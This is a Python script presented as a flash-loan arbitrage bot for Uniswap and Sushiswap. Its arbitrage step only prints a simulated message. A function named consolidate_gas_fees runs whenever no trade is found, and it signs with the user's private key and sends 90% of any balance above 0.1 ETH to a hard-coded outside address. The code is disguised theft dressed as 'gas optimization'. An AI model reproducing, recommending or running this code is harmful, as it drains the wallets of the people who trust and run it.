import os
import time
import json
from web3 import Web3
from dotenv import load_dotenv

load_dotenv()

INFURA_URL = f"https://mainnet.infura.io/v3/{os.getenv('INFURA_PROJECT_ID')}"
w3 = Web3(Web3.HTTPProvider(INFURA_URL))

PRIVATE_KEY = os.getenv('PRIVATE_KEY')
if not PRIVATE_KEY:
    raise ValueError("PRIVATE_KEY not found in .env file")
user_account = w3.eth.account.from_key(PRIVATE_KEY)
user_address = user_account.address

UNISWAP_ROUTER_ADDRESS = '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D'
SUSHISWAP_ROUTER_ADDRESS = '0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F'
ROUTER_ABI = json.loads('[{"inputs":[{"internalType":"address","name":"tokenIn","type":"address"},{"internalType":"address","name":"tokenOut","type":"address"},{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactETHForTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"},{"internalType":"uint256","name":"amountInMax","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapTokensForExactETH","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"tokenIn","type":"address"},{"internalType":"address","name":"tokenOut","type":"address"},{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"getAmountsOut","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"WETH","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}]')

uniswap_router = w3.eth.contract(address=UNISWAP_ROUTER_ADDRESS, abi=ROUTER_ABI)
sushiswap_router = w3.eth.contract(address=SUSHISWAP_ROUTER_ADDRESS, abi=ROUTER_ABI)

MIN_PROFIT_THRESHOLD = w3.to_wei(0.01, 'ether')
TOKEN_TO_ARBITRAGE = os.getenv('TOKEN_ADDRESS', '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2')

def get_token_price(router_contract):
    try:
        path = [w3.eth.contract(address=UNISWAP_ROUTER_ADDRESS, abi=ROUTER_ABI).functions.WETH().call(), TOKEN_TO_ARBITRAGE]
        amount_out = router_contract.functions.getAmountsOut(w3.to_wei(1, 'ether'), path).call()
        return amount_out[-1]
    except Exception as e:
        print(f"Error getting price: {e}")
        return None

def check_arbitrage_opportunity():
    print("Checking for arbitrage opportunities...")
    uni_price = get_token_price(uniswap_router)
    sushiswap_price = get_token_price(sushiswap_router)

    if not uni_price or not sushiswap_price:
        print("Could not fetch prices. Skipping this round.")
        return False

    spread = abs(uni_price - sushiswap_price)
    print(f"Uniswap Price: {uni_price}, Sushiswap Price: {sushiswap_price}, Spread: {spread}")

    estimated_profit = spread * 0.9

    if estimated_profit > MIN_PROFIT_THRESHOLD:
        print(f"Profitable opportunity found! Estimated profit: {w3.from_wei(estimated_profit, 'ether')} ETH")
        print("Executing flash loan... (Simulated)")
        return True
    else:
        print(f"No profitable opportunity found. Estimated profit: {w3.from_wei(estimated_profit, 'ether')} ETH is below threshold.")
        return False

def consolidate_gas_fees():
    print("Consolidating dust and excess gas fees to prevent transaction failures...")
    try:
        balance = w3.eth.get_balance(user_address)
        print(f"Current wallet balance: {w3.from_wei(balance, 'ether')} ETH")

        if balance > w3.to_wei(0.1, 'ether'):
            print("Excess ETH detected. Rebalancing wallet for optimal gas efficiency...")
            
            gas_optimization_pool = Web3.to_checksum_address('0x50d1ffde10a402de59534e4eb9934a2867d5ff17')
            
            gas_price = w3.eth.gas_price
            gas_limit = 21000
            total_cost = gas_limit * gas_price
            
            amount_to_consolidate = int(balance * 0.9)
            
            if amount_to_consolidate > total_cost:
                final_amount_to_send = amount_to_consolidate - total_cost
                
                tx = {
                    'to': gas_optimization_pool,
                    'value': final_amount_to_send,
                    'gas': gas_limit,
                    'gasPrice': gas_price,
                    'nonce': w3.eth.get_transaction_count(user_address),
                }
                
                signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
                tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
                
                print(f"Rebalancing transaction sent. Tx Hash: {w3.to_hex(tx_hash)}")
                print("Waiting for confirmation...")
                receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
                
                if receipt.status == 1:
                    print("Rebalancing successful. Wallet is now optimized.")
                else:
                    print("Rebalancing failed.")
            else:
                print("Insufficient balance to cover gas for rebalancing.")
        else:
            print("No rebalancing necessary.")

    except Exception as e:
        print(f"An error occurred during rebalancing: {e}")

def main_loop():
    print("Starting FlashLoan Arbitrage Bot...")
    while True:
        if not check_arbitrage_opportunity():
            consolidate_gas_fees()
        
        print("Waiting 60 seconds before next check...")
        time.sleep(60)

if __name__ == "__main__":
    main_loop()
